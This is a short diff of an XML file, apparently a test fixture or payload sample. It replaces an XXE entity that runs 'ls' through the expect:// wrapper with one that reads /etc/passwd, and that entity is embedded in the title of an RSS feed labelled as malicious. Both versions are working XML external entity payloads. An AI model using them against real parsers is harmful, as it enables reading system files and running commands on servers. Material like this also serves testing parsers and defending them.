@@ -1,9 +1,11 @@
-<?xml version="1.0"?>
+<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
-  <!ENTITY cmd SYSTEM "expect://ls">
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
-<data>
-  <result>
-    &cmd;
-  </result>
-</data>
+<rss version="2.0">
+  <channel>
+    <title>&xxe;</title>
+    <link>http://example.com</link>
+    <description>Un flux malicieux</description>
+  </channel>
+</rss>
